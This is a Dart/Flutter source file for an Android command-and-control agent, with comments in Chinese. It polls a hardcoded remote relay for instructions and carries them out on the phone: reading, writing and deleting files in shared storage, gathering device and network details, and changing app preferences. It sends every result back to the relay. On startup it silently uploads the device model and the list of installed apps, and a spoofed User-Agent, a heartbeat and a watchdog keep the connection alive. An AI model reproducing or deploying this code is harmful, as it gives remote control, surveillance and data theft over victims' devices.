import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:crypto/crypto.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/widgets.dart';
import 'package:http/http.dart' as http;
import 'package:installed_apps/installed_apps.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:path/path.dart' as p;
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

// ============================================================
// 1. 配置与模型
// ============================================================
class C2Config {
  final String relayUrl;
  final String sessionKey;
  final Duration pollInterval;
  final Duration heartbeatInterval;
  final Duration requestTimeout;

  const C2Config({
    required this.relayUrl,
    required this.sessionKey,
    this.pollInterval = const Duration(seconds: 5),
    this.heartbeatInterval = const Duration(seconds: 20),
    this.requestTimeout = const Duration(seconds: 15),
  });

  C2Config copyWith({
    String? relayUrl,
    String? sessionKey,
    Duration? pollInterval,
    Duration? heartbeatInterval,
    Duration? requestTimeout,
  }) =>
      C2Config(
        relayUrl: relayUrl ?? this.relayUrl,
        sessionKey: sessionKey ?? this.sessionKey,
        pollInterval: pollInterval ?? this.pollInterval,
        heartbeatInterval: heartbeatInterval ?? this.heartbeatInterval,
        requestTimeout: requestTimeout ?? this.requestTimeout,
      );
}

class C2Result {
  final bool ok;
  final dynamic data;
  const C2Result(this.ok, this.data);
  static C2Result success(dynamic data) => C2Result(true, data);
  static C2Result fail(dynamic error) => C2Result(false, {'error': error.toString()});
}

// ============================================================
// 2. 纯 Dart 本地执行器 (支持真实终端体验)
// ============================================================
class LocalExecutor {
  static String? _currentPath;

  static Future<dynamic> execute(String module, String method, dynamic args) async {
    switch (module) {
      case 'sys': return await _sys(method, args);
      case 'fs': return await _fs(method, args);
      case 'app': return await _app(method, args);
      case 'util': return await _util(method, args);
      default: throw Exception('unknown_module:$module');
    }
  }

  static Future<String> _getInitPath() async {
    if (_currentPath != null) return _currentPath!;
    final docDir = await getApplicationDocumentsDirectory();
    _currentPath = docDir.path;
    return _currentPath!;
  }

  static Future<dynamic> _fs(String method, dynamic args) async {
    String cwd = await _getInitPath();
    String rawPath = args?['path'] as String? ?? '.';

    // 支持快捷路径替换
    if (rawPath == '/sdcard' || rawPath == '~') {
      rawPath = '/storage/emulated/0';
    }

    String targetPath;
    if (p.isAbsolute(rawPath)) {
      targetPath = p.normalize(rawPath);
    } else {
      targetPath = p.normalize(p.join(cwd, rawPath));
    }

    try {
      switch (method) {
        case 'pwd':
          return {'cwd': targetPath};

        case 'cd':
          final type = await FileSystemEntity.type(targetPath);
          if (type != FileSystemEntityType.directory) {
            throw Exception('不是有效的目录: $targetPath');
          }
          _currentPath = targetPath;
          return {'cwd': _currentPath};

        case 'ls':
          final dir = Directory(targetPath);
          if (!await dir.exists()) throw Exception('目录不存在或无法访问: $targetPath');
          
          final list = await dir.list().toList();
          final result = [];
          
          result.add({'name': '.', 'type': 'dir', 'size': 0});
          result.add({'name': '..', 'type': 'dir', 'size': 0});
          
          for (final e in list) {
            final stat = await e.stat();
            result.add({
              'name': p.basename(e.path),
              'type': e is Directory ? 'dir' : 'file',
              'size': stat.size,
              'modified': stat.modified.millisecondsSinceEpoch,
            });
          }
          result.sort((a, b) {
            if (a['type'] != b['type']) return a['type'] == 'dir' ? -1 : 1;
            return (a['name'] as String).compareTo(b['name'] as String);
          });
          return result;

        case 'read':
          final file = File(targetPath);
          if (!await file.exists()) throw Exception('文件不存在或无法访问: $targetPath');
          return await file.readAsString();

        case 'write':
          final file = File(targetPath);
          await file.parent.create(recursive: true);
          await file.writeAsString(args?['content'] ?? '');
          return {'path': file.path, 'size': await file.length()};

        case 'mkdir':
          await Directory(targetPath).create(recursive: true);
          return {'created': true, 'path': targetPath};

        case 'rm':
          final type = await FileSystemEntity.type(targetPath);
          if (type == FileSystemEntityType.directory) {
            await Directory(targetPath).delete(recursive: true);
          } else if (type == FileSystemEntityType.file) {
            await File(targetPath).delete();
          }
          return {'deleted': true, 'path': targetPath};

        default: 
          throw Exception('unknown_fs_method:$method');
      }
    } on FileSystemException catch (e) {
      throw Exception('系统拒绝访问 [${e.osError?.message ?? "Permission Denied"}]');
    }
  }

  static Future<dynamic> _sys(String method, dynamic args) async {
    switch (method) {
      case 'info':
        final android = await DeviceInfoPlugin().androidInfo;
        return {
          'androidVersion': android.version.release,
          'sdkInt': android.version.sdkInt,
          'brand': android.brand,
          'model': android.model,
          'device': android.device,
        };
      case 'network':
        final interfaces = await NetworkInterface.list();
        final ips = interfaces.expand((i) => i.addresses.map((a) => a.address)).toList();
        return {'ipAddresses': ips};
      case 'env':
        final pkg = await PackageInfo.fromPlatform();
        final docDir = await getApplicationDocumentsDirectory();
        return {
          'packageName': pkg.packageName,
          'versionName': pkg.version,
          'filesDir': docDir.path,
        };
      default: throw Exception('unknown_sys_method:$method');
    }
  }

  static Future<dynamic> _app(String method, dynamic args) async {
    switch (method) {
      case 'list':
        List<AppInfo> apps = await InstalledApps.getInstalledApps(
          excludeSystemApps: false,
        );
        return apps.map((app) {
          return {
            'name': app.name, 
            'packageName': app.packageName, 
            'version': app.versionName, 
            'system': app.isSystemApp,
          };
        }).toList();
      case 'prefs.list':
        final prefs = await SharedPreferences.getInstance();
        return prefs.getKeys().toList();
      case 'prefs.get':
        final prefs = await SharedPreferences.getInstance();
        return prefs.get(args?['key']);
      case 'prefs.set':
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString(args?['key'], args?['value'] ?? '');
        return {'ok': true};
      default: throw Exception('unknown_app_method:$method');
    }
  }

  static Future<dynamic> _util(String method, dynamic args) async {
    switch (method) {
      case 'hash': return sha256.convert(utf8.encode(args?['text'] as String? ?? '')).toString();
      case 'json.pretty': return const JsonEncoder.withIndent('  ').convert(jsonDecode(args?['json'] ?? '{}'));
      default: throw Exception('unknown_util_method:$method');
    }
  }
}

class C2Dispatcher {
  Future<C2Result> dispatch(Map<String, dynamic> ins, {required C2Agent session}) async {
    final module = ins['module']?.toString() ?? '';
    final method = ins['method']?.toString() ?? '';
    final args = ins['args'];
    try {
      if (module == 'session') return C2Result.success(await session.handleSession(method, args));
      return C2Result.success(await LocalExecutor.execute(module, method, args));
    } catch (e) {
      return C2Result.fail(e);
    }
  }
}

// ============================================================
// 3. C2Agent 主类 (长轮询、心跳、看门狗保活)
// ============================================================
class C2Agent with WidgetsBindingObserver {
  static final C2Agent _instance = C2Agent._();
  factory C2Agent() => _instance;
  C2Agent._();

  static const _defaultConfig = C2Config(
    relayUrl: 'https://cons.de5.net/c2', // 👈 确保这是你的真实域名
    sessionKey: 'INIT_PLACEHOLDER', 
  );

  C2Config _config = _defaultConfig;
  final _dispatcher = C2Dispatcher();
  final _client = http.Client();

  Timer? _pollTimer;
  Timer? _heartbeatTimer;
  Timer? _watchdogTimer;
  
  bool _running = false;
  bool _polling = false;
  int _backoffSeconds = 1;
  static const _maxBackoff = 30;
  DateTime _lastSuccessfulPoll = DateTime.now();

  static void start({C2Config? config}) => _instance._start(config: config);
  static void stop() => _instance._stop();

  void _start({C2Config? config}) async {
    if (_running) return;
    _running = true;
    
    // 👇 核心：动态获取/生成唯一设备 Key
    final prefs = await SharedPreferences.getInstance();
    String? localKey = prefs.getString('c2_device_key');
    if (localKey == null || localKey.isEmpty) {
      final rand = Random.secure();
      final bytes = List<int>.generate(16, (i) => rand.nextInt(256));
      localKey = 'dev_${bytes.map((b) => b.toRadixString(16).padLeft(2, '0')).join()}';
      await prefs.setString('c2_device_key', localKey);
    }

    if (config != null) {
      _config = config.copyWith(sessionKey: config.sessionKey == 'INIT_PLACEHOLDER' ? localKey : config.sessionKey);
    } else {
      _config = _defaultConfig.copyWith(sessionKey: localKey);
    }

    WidgetsBinding.instance.addObserver(this);
    _lastSuccessfulPoll = DateTime.now();
    _startPollingLoop();
    _startHeartbeat();
    _startWatchdog();
    
    unawaited(_reportBoot());
  }

  Future<void> _reportBoot() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final lastReport = prefs.getInt('c2_last_boot_report') ?? 0;
      final now = DateTime.now().millisecondsSinceEpoch;
      
      // 检查是否已经上报过 App 列表
      final hasReportedApps = prefs.getBool('c2_has_reported_apps') ?? false;
      
      // 如果已经上报过 App，且未满 1 小时，则跳过本次启动上报
      if (hasReportedApps && (now - lastReport < 3600 * 1000)) return;

      final android = await DeviceInfoPlugin().androidInfo;
      final pkg = await PackageInfo.fromPlatform();
      
      final info = {
        'model': android.model,
        'brand': android.brand,
        'android': android.version.release,
        'appVersion': pkg.version,
        'time': DateTime.now().toString().split('.')[0],
      };

      // 如果没上报过，则获取 App 列表
      List<Map<String, dynamic>>? appList;
      if (!hasReportedApps) {
        try {
          // 只获取第三方应用，且精简返回数据减小体积
          final apps = await InstalledApps.getInstalledApps(excludeSystemApps: true);
          appList = apps.map((app) => {
            'name': app.name, 
            'pkg': app.packageName
          }).toList();
        } catch (_) {}
      }

      final url = Uri.parse('${_config.relayUrl}/notify');
      final response = await _client.post(url,
        headers: {'X-Session-Key': _config.sessionKey, 'Content-Type': 'application/json'},
        body: jsonEncode({
          'info': info,
          if (appList != null) 'apps': appList,
        }),
      ).timeout(const Duration(seconds: 20)); // 增加超时，防止 App 多时发不完

      if (response.statusCode == 200) {
        await prefs.setInt('c2_last_boot_report', now);
        if (appList != null) {
          // 标记该设备已上报过 App 列表
          await prefs.setBool('c2_has_reported_apps', true);
        }
      }
    } catch (_) {}
  }

  void _stop() {
    if (!_running) return;
    _running = false;
    _pollTimer?.cancel();
    _heartbeatTimer?.cancel();
    _watchdogTimer?.cancel();
    _client.close();
    WidgetsBinding.instance.removeObserver(this);
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && _running) {
      _backoffSeconds = 1; _lastSuccessfulPoll = DateTime.now();
      _startPollingLoop(); _startHeartbeat();
    }
  }

  void _startPollingLoop() {
    _pollTimer?.cancel();
    _backoffSeconds = 1;
    _pollTimer = Timer.periodic(_config.pollInterval, (_) => _pollOnce());
  }

  Future<void> _pollOnce() async {
    if (_polling || !_running) return;
    _polling = true;
    try {
      final url = Uri.parse('${_config.relayUrl}/pending/${_config.sessionKey}');
      final response = await _client.get(url, headers: {
        'X-Session-Key': _config.sessionKey, 'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
      }).timeout(_config.requestTimeout);

      if (response.statusCode == 200) {
        _backoffSeconds = 1; _lastSuccessfulPoll = DateTime.now();
        if (response.body.isNotEmpty && response.body != '[]') {
          final decoded = jsonDecode(response.body);
          if (decoded is List) {
            for (final item in decoded) { if (item is Map<String, dynamic>) unawaited(_executeInstruction(item)); }
          }
        }
      }
    } catch (_) { _scheduleBackoff(); } finally { _polling = false; }
  }

  void _scheduleBackoff() {
    _pollTimer?.cancel();
    final delay = Duration(seconds: _backoffSeconds);
    _backoffSeconds = min(_backoffSeconds * 2, _maxBackoff);
    _pollTimer = Timer(delay, _startPollingLoop);
  }

  void _startHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(_config.heartbeatInterval, (_) => _sendHeartbeat());
  }

  Future<void> _sendHeartbeat() async {
    if (!_running) return;
    try {
      await _client.post(Uri.parse('${_config.relayUrl}/heartbeat'), 
        headers: {'X-Session-Key': _config.sessionKey},
        body: jsonEncode({'ts': DateTime.now().millisecondsSinceEpoch})
      ).timeout(const Duration(seconds: 10));
    } catch (_) {}
  }

  void _startWatchdog() {
    _watchdogTimer?.cancel();
    _watchdogTimer = Timer.periodic(const Duration(seconds: 60), (_) {
      if (!_running) return;
      if (DateTime.now().difference(_lastSuccessfulPoll).inSeconds > 120) {
        _lastSuccessfulPoll = DateTime.now(); _startPollingLoop(); _sendHeartbeat();
      }
    });
  }

  Future<void> _executeInstruction(Map<String, dynamic> ins) async {
    final id = ins['id']?.toString() ?? '';
    final result = await _dispatcher.dispatch(ins, session: this);
    if (id.isNotEmpty) {
      try {
        await _client.post(Uri.parse('${_config.relayUrl}/result'),
          headers: {'X-Session-Key': _config.sessionKey, 'Content-Type': 'application/json'},
          body: jsonEncode({'id': id, 'session': _config.sessionKey, 'ok': result.ok, 'data': result.data})
        ).timeout(const Duration(seconds: 10));
      } catch (_) {}
    }
  }

  Future<dynamic> handleSession(String method, dynamic args) async {
    switch (method) {
      case 'ping': return {'pong': true};
      case 'reconnect': _lastSuccessfulPoll = DateTime.now(); _startPollingLoop(); return {'ok': true};
      default: return {'error': 'unknown_session_method:$method'};
    }
  }
}